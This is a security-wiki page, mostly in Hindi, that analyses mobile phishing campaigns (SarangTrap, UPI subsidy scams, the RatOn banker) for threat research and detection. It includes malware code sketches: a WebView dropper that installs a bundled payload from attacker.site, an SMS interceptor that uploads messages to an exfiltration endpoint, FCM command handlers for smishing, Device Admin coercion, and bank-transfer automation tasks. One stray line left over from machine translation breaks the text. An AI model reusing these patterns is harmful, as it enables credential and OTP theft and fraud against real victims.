# मोबाइल Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पृष्ठ उन तकनीकों को कवर करता है जिनका उपयोग थ्रेट एक्टर्स द्वारा phishing (SEO, social engineering, fake stores, dating apps, आदि) के माध्यम से **malicious Android APKs** और **iOS mobile-configuration profiles** वितरित करने के लिए किया जाता है।  
> सामग्री SarangTrap अभियान (Zimperium zLabs द्वारा उजागर, 2025) और अन्य सार्वजनिक शोध से अनुकूलित है।

## हमला प्रवाह

1. **SEO/Phishing इंफ्रास्ट्रक्चर**
* दर्जनों look-alike डोमेनों को रजिस्टर करें (dating, cloud share, car service…).
– `<title>` एलिमेंट में स्थानीय भाषा के keywords और emojis का उपयोग करें ताकि Google में रैंकिंग मिले।
– एक ही लैंडिंग पेज पर *दोनों* Android (`.apk`) और iOS इंस्टॉल निर्देश होस्ट करें।
2. **पहला चरण: डाउनलोड**
* Android: एक डायरेक्ट लिंक जो *unsigned* या “third-party store” APK की ओर जाता है।
* iOS: `itms-services://` या सामान्य HTTPS लिंक जो एक malicious **mobileconfig** प्रोफ़ाइल की ओर इशारा करता है (नीचे देखें)।
3. **इंस्टॉल के बाद Social Engineering**
* पहली बार चलाने पर ऐप एक **invitation / verification code** माँगता है (विशेष पहुंच का भ्रम)।
* कोड **HTTP पर POST** किया जाता है Command-and-Control (C2) को।
* C2 उत्तर देता है `{"success":true}` ➜ मैलवेयर जारी रहता है।
* जो सैंडबॉक्स / AV डायनामिक एनालिसिस वैध कोड सबमिट नहीं करता वह **कोई मालिशियस व्यवहार नहीं** देखता (evasion)।
4. **Runtime Permission Abuse (Android)**
* खतरनाक permissions सिर्फ **positive C2 response के बाद** अनुरोध किए जाते हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* हालिया वेरिएंट्स `AndroidManifest.xml` से SMS के लिए `<uses-permission>` हटाते हैं लेकिन Java/Kotlin कोड पाथ को reflection के माध्यम से SMS पढ़ने के लिए छोड़ देते हैं ⇒ इससे static स्कोर कम होता है जबकि AppOps abuse या पुराने लक्ष्यों पर कार्यशील रहता है।
5. **Facade UI और Background Collection**
* ऐप लोकल रूप से harmless views (SMS viewer, gallery picker) दिखाता है।
* इस बीच यह निम्न एक्सफ़िल्ट्रेट करता है:
- IMEI / IMSI, फोन नंबर
- पूरा `ContactsContract` dump (JSON array)
- `/sdcard/DCIM` से JPEG/PNG, आकार कम करने के लिए [Luban](https://github.com/Curzibn/Luban) से compress किया गया
- वैकल्पिक SMS सामग्री (`content://sms`)
पेलोड्स को **batch-zipped** करके `HTTP POST /upload.php` के जरिए भेजा जाता है।
6. **iOS Delivery Technique**
* एक अकेला **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि अनुरोध कर सकता है ताकि डिवाइस को “MDM”-समान supervision में enroll किया जा सके।
* Social-engineering निर्देश:
1. Settings खोलें ➜ *Profile downloaded*.
2. तीन बार *Install* पर टैप करें (फिशिंग पेज पर स्क्रीनशॉट)।
3. unsigned प्रोफ़ाइल को Trust करें ➜ हमलावर को App Store समीक्षा के बिना *Contacts* और *Photo* entitlement मिल जाता है।
7. **नेटवर्क लेयर**
* सादा HTTP, अक्सर पोर्ट 80 पर HOST हेडर जैसा `api.<phishingdomain>.com` के साथ।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (कोई TLS नहीं → आसानी से पकड़ा जा सकता है)।

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – मैलवेयर आकलन के दौरान, invitation code चरण को Frida/Objection से automate करके malicious ब्रांच तक पहुँचें।
* **Manifest vs. Runtime Diff** – `aapt dump permissions` की तुलना runtime `PackageManager#getRequestedPermissions()` से करें; गायब खतरनाक परमिशन्स एक रेड फ्लैग हैं।
* **Network Canary** – कोड एंट्री के बाद असामान्य POST बर्स्ट का पता लगाने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` कॉन्फ़िगर करें।
* **mobileconfig Inspection** – macOS पर `security cms -D -i profile.mobileconfig` का उपयोग करके `PayloadContent` सूचीबद्ध करें और अत्यधिक entitlements पहचानें।

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** ताकि sudden bursts वाले keyword-rich डोमेन पकड़े जा सकें।
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` Dalvik क्लाइंट्स से जिन्हें Google Play के बाहर देखा गया हो।
* **Invite-code Telemetry** – APK इंस्टॉल के तुरंत बाद 6–8 अंक के न्यूमेरिक कोड का POST स्टेजिंग का संकेत हो सकता है।
* **MobileConfig Signing** – unsigned configuration profiles को MDM नीति के जरिए ब्लॉक करें।

## उपयोगी Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## सूचक (सामान्य)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### भरोसेमंद प्लेटफ़ॉर्म्स पर वितरण श्रृंखला
- YouTube लुभावना वीडियो → विवरण में एक शॉर्ट लिंक होता है
- Shortlink → GitHub Pages पर आधिकारिक पोर्टल की नकल करने वाली phishing साइट
- वही GitHub repo एक APK होस्ट करता है जिसमें नकली “Google Play” बैज होता है जो सीधे फाइल से लिंक करता है
- डायनेमिक phishing पेज Replit पर रहते हैं; रिमोट कमांड चैनल Firebase Cloud Messaging (FCM) का उपयोग करता है

### Dropper with embedded payload and offline install
- पहला APK एक installer (dropper) है जो वास्तविक malware को `assets/app.apk` पर भेजता है और यूज़र को क्लाउड-आधारित डिटेक्शन को बेअसर करने के लिए Wi‑Fi/mobile data बंद करने का संकेत देता है।
- Embedded payload एक सामान्य लेबल (उदा., “Secure Update”) के नाम से इंस्टॉल होता है। इंस्टॉल के बाद, installer और payload दोनों अलग-अलग apps के रूप में मौजूद रहते हैं।

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink के माध्यम से डायनामिक endpoint की खोज
- Malware एक shortlink से plain-text, comma-separated list लेता है जिसमें live endpoints होते हैं; सरल string transforms अंतिम phishing page path उत्पन्न करते हैं।

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
छद्म-कोड:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” चरण WebView के अंदर dynamic endpoint से हमलावर का HTML फॉर्म लोड करता है और संवेदनशील फ़ील्ड्स (phone, bank, UPI PIN) को कैप्चर करता है जिन्हें `POST` करके `addup.php` पर भेजा जाता है।

न्यूनतम लोडर:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- पहली बार चलाने पर आक्रामक permissions का अनुरोध किया जाता है:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contacts को लूप किया जाता है ताकि पीड़ित के डिवाइस से smishing SMS बड़े पैमाने पर भेजे जा सकें.
- Incoming SMS को एक broadcast receiver द्वारा इंटरसेप्ट किया जाता है और metadata (sender, body, SIM slot, per-device random ID) के साथ `/addsm.php` पर अपलोड किया जाता है.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) के रूप में लचीला C2
- Payload FCM में रजिस्टर होता है; push messages में `_type` फील्ड होता है जिसका उपयोग क्रियाओं को ट्रिगर करने के लिए एक स्विच की तरह किया जाता है (उदा., phishing टेक्स्ट टेम्पलेट्स अपडेट करना, व्यवहार टॉगल करना).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler रूपरेखा:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### हंटिंग पैटर्न और IOCs
- APK में सेकेंडरी payload `assets/app.apk` में मौजूद है
- WebView `gate.htm` से payment लोड करता है और `/addup.php` पर exfiltrate करता है
- SMS का exfiltration `/addsm.php` पर
- Shortlink-ड्रिवन config fetch (e.g., `rebrand.ly/*`) जो CSV endpoints लौटाता है
- ऐसे ऐप्स जिन्हें generic “Update/Secure Update” लेबल किया गया हो
- FCM `data` संदेश अनट्रस्टेड ऐप्स में जिनमें `_type` discriminator होता है

### डिटेक्शन और डिफेंस आइडियाज
- उन ऐप्स को flag करें जो इंस्टॉल के दौरान उपयोगकर्ताओं से नेटवर्क डिसेबल करने को कहते हैं और फिर `assets/` से दूसरी APK side-load करते हैं।
- permission tuple पर अलर्ट: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-आधारित payment flows।
- non-corporate hosts पर `POST /addup.php|/addsm.php` के लिए egress मॉनिटरिंग; ज्ञात infrastructure को block करें।
- Mobile EDR नियम: untrusted ऐप जो FCM के लिए register करता है और `_type` field पर branching करता है।

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

The RatOn banker/RAT campaign (ThreatFabric) आधुनिक mobile phishing ऑपरेशन्स का एक ठोस उदाहरण है जहाँ WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, और यहाँ तक कि NFC-relay orchestration को मिलाकर इस्तेमाल किया जाता है। यह सेक्शन इन reusable techniques का सार प्रस्तुत करता है।

### Stage-1: WebView → native install bridge (dropper)
आक्रमणकारी एक WebView दिखाते हैं जो attacker पेज की ओर इशारा करता है और एक JavaScript interface inject करते हैं जो एक native installer को एक्सपोज़ करता है। HTML बटन पर टैप native कोड को कॉल करता है जो dropper के assets में बंडल किए गए second-stage APK को install करता है और फिर उसे सीधे लॉन्च कर देता है।

Minimal pattern:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Please paste the HTML/markdown content you want translated (the file or page contents).
```html
<button onclick="bridge.installApk()">Install</button>
```
इंस्टॉल के बाद, dropper explicit package/activity के माध्यम से payload को शुरू करता है:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### स्वीकृति फ़नल: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 एक WebView खोलता है जो “Access” पेज होस्ट करता है। इसका बटन एक exported method को invoke करता है जो विक्टिम को Accessibility settings पर नेविगेट करके rogue service को enable करने का अनुरोध करता है। एक बार अनुमति मिलने पर, malware Accessibility का उपयोग करके बाद के runtime permission dialogs (contacts, overlay, manage system settings, etc.) में auto-click करके अनुमतियाँ स्वीकार करवा देता है और Device Admin के लिए अनुरोध करता है।

- Accessibility प्रोग्रामेटिकली बाद के prompts स्वीकार करने में मदद करता है — node-tree में “Allow”/“OK” जैसे बटन ढूंढकर और उन पर क्लिक भेजकर।
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
इन्हें भी देखें:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom (WebView के माध्यम से)
ऑपरेटर निम्नलिखित कमांड जारी कर सकते हैं:
- एक URL से पूर्ण-स्क्रीन ओवरले रेंडर करना, या
- इनलाइन HTML पास करना जिसे WebView ओवरले में लोड किया जाए।

संभावित उपयोग: coercion (PIN entry), wallet खोलकर PIN कैप्चर करना, ransom संदेश भेजना। यदि ओवरले अनुमति मौजूद नहीं है तो उसे सुनिश्चित करने के लिए एक कमांड रखें।

### Remote control model – text pseudo-screen + screen-cast
- कम-बैंडविड्थ: Accessibility node tree को आवधिक रूप से dump करें, दिखाई देने वाले texts/roles/bounds को serialize करें और उन्हें pseudo-screen के रूप में C2 पर भेजें (commands like `txt_screen` once and `screen_live` continuous)।
- उच्च-निष्ठा: MediaProjection का अनुरोध करें और मांग पर screen-casting/recording शुरू करें (commands like `display` / `record`)।

### ATS playbook (bank app automation)
एक JSON task दिए जाने पर, बैंक ऐप खोलें, Accessibility के जरिए UI को text queries और coordinate taps के मिश्रण से नियंत्रित करें, और संकेत मिलने पर पीड़ित का payment PIN दर्ज करें।

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "नया भुगतान"
- "Zadat platbu" → "भुगतान दर्ज करें"
- "Nový příjemce" → "नया प्राप्तकर्ता"
- "Domácí číslo účtu" → "घरेलू खाता संख्या"
- "Další" → "अगला"
- "Odeslat" → "भेजें"
- "Ano, pokračovat" → "हाँ, जारी रखें"
- "Zaplatit" → "भुगतान करें"
- "Hotovo" → "हो गया"

ऑपरेटर्स `check_limit` और `limit` जैसे कमांड के माध्यम से ट्रांसफर सीमाएँ भी चेक/बढ़ा सकते हैं, जो limits UI में समान रूप से नेविगेट करते हैं।

### Crypto wallet seed extraction
Targets जैसे MetaMask, Trust Wallet, Blockchain.com, Phantom। Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it। नेविगेशन को विभिन्न भाषाओं में स्थिर करने के लिए locale-aware selectors (EN/RU/CZ/SK) लागू करें।

### Device Admin coercion
Device Admin APIs का उपयोग PIN-capture के अवसर बढ़ाने और पीड़ित को परेशान करने के लिए किया जाता है:

- तत्काल लॉक:
```java
dpm.lockNow();
```
- वर्तमान credential की अवधि समाप्त करें ताकि बदलने के लिए बाध्य किया जा सके (Accessibility नए PIN/password को कैप्चर करता है):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard बायोमेट्रिक सुविधाओं को अक्षम करके गैर-बायोमेट्रिक अनलॉक को मजबूर करें:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC रिले समन्वय (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- WebViews में `addJavascriptInterface()` वाले पेजों की तलाश करें जो installer/permission methods को एक्सपोज़ करते हैं; ऐसे पेज जो “/access” पर समाप्त होते हैं और Accessibility prompts ट्रिगर करते हैं।
- उन ऐप्स पर अलर्ट करें जो service access दिए जाने के तुरंत बाद high-rate Accessibility gestures/clicks जनरेट करते हैं; telemetry जो Accessibility node dumps जैसी दिखती है और C2 को भेजी जाती है।
- अनट्रस्टेड ऐप्स में Device Admin policy बदलावों की निगरानी करें: `lockNow`, password expiration, keyguard feature toggles।
- non-corporate apps से MediaProjection prompts पर और उसके बाद periodic frame uploads पर अलर्ट करें।
- किसी ऐप द्वारा ट्रिगर किए गए external NFC-relay app की installation/launch का पता लगाएं।
- बैंकिंग के लिए: out-of-band confirmations, biometrics-binding, और on-device automation के प्रति resistant transaction-limits लागू करें।

## संदर्भ

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
